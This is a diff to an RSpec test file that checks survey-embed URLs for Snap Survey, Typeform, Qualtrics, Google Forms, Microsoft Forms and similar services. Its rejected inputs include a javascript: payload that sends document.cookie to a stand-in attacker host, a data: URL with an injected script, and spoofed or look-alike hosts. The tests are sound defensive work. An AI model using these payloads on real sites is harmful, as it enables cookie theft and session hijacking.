@@ -56,6 +56,68 @@ describe Surveys::SurveyPhase do
     end
   end
 
+  def survey_phase(service, url)
+    build(:phase, participation_method: 'survey', survey_service: service, survey_embed_url: url)
+  end
+
+  describe 'validate survey_embed_url for Snap Survey' do
+    it 'validates URLs on welcomesyourfeedback.net and snapsurveys.com' do
+      expect(survey_phase('snap_survey', 'https://acme.welcomesyourfeedback.net/s/abc123')).to be_valid
+      expect(survey_phase('snap_survey', 'https://acme.welcomesyourfeedback.net?id=abc123')).to be_valid
+      expect(survey_phase('snap_survey', 'https://snapsurveys.com/wh/s.asp?k=abc123')).to be_valid
+      expect(survey_phase('snap_survey', 'https://online.snapsurveys.com/wh/s.asp?k=abc123')).to be_valid
+    end
+
+    it 'invalidates javascript: URLs that end with snapsurveys.com/ (GV-04)' do
+      expect(survey_phase('snap_survey', 'javascript:alert(document.cookie)//snapsurveys.com/')).to be_invalid
+      expect(survey_phase('snap_survey', "javascript:fetch('//evil.example/'+document.cookie)//x.snapsurveys.com/")).to be_invalid
+    end
+
+    it 'invalidates other schemes and hosts' do
+      expect(survey_phase('snap_survey', 'http://acme.welcomesyourfeedback.net/s/abc123')).to be_invalid
+      expect(survey_phase('snap_survey', 'data:text/html,<script>alert(1)</script>snapsurveys.com/')).to be_invalid
+      expect(survey_phase('snap_survey', 'https://evil.example/snapsurveys.com/')).to be_invalid
+      expect(survey_phase('snap_survey', 'https://evil.example/x.welcomesyourfeedback.net/')).to be_invalid
+      expect(survey_phase('snap_survey', 'https://snapsurveys.com.evil.example/')).to be_invalid
+      expect(survey_phase('snap_survey', 'https://evilsnapsurveys.com/')).to be_invalid
+      expect(survey_phase('snap_survey', 'https://acme.welcomesyourfeedbackXnet/')).to be_invalid
+      expect(survey_phase('snap_survey', 'https://snapsurveys.com@evil.example/')).to be_invalid
+    end
+  end
+
+  describe 'survey_embed_url host checks for the other services' do
+    {
+      'typeform' => 'https://citizenlabco.typeform.com/to/HKGaPV',
+      'google_forms' => 'https://docs.google.com/forms/d/e/fake/viewform?embedded=true',
+      'enalyzer' => 'https://surveys.enalyzer.com?pid=HKGaPV',
+      'qualtrics' => 'https://acme.eu.qualtrics.com/jfe/form/SV_abc123',
+      'survey_monkey' => 'https://widget.surveymonkey.com/collect/website/js/abc123.js',
+      'survey_xact' => 'https://www.survey-xact.dk/LinkCollector?key=abc123',
+      'smart_survey' => 'https://www.smartsurvey.co.uk/s/LU3JMS/',
+      'microsoft_forms' => 'https://forms.office.com/e/HKGaPV'
+    }.each do |service, valid_url|
+      it "validates a regular #{service} URL" do
+        expect(survey_phase(service, valid_url)).to be_valid
+      end
+    end
+
+    it 'invalidates Typeform and Qualtrics URLs whose host is not on their domain' do
+      expect(survey_phase('typeform', 'https://evil.example/x.typeform.com/to/HKGaPV')).to be_invalid
+      expect(survey_phase('typeform', 'https://evil.example?x.typeform.com/to/HKGaPV')).to be_invalid
+      expect(survey_phase('typeform', 'https://x.typeform.com@evil.example/x.typeform.com/to/HKGaPV')).to be_invalid
+      expect(survey_phase('qualtrics', 'https://evil.example/x.qualtrics.com/jfe/form/SV_abc123')).to be_invalid
+    end
+
+    it 'invalidates Google Forms and Enalyzer look-alike hosts' do
+      expect(survey_phase('google_forms', 'https://docs-google.com/forms/d/e/fake/viewform?embedded=true')).to be_invalid
+      expect(survey_phase('enalyzer', 'https://surveys-enalyzer.com?pid=HKGaPV')).to be_invalid
+    end
+
+    it 'invalidates Microsoft Forms URLs with a line break' do
+      expect(survey_phase('microsoft_forms', "https://forms.office.com/\njavascript:alert(1)")).to be_invalid
+    end
+  end
+
   describe 'validate survey_embed_url for Microsoft Forms' do
     def microsoft_forms_phase(url)
       build(:phase, participation_method: 'survey', survey_service: 'microsoft_forms', survey_embed_url: url)
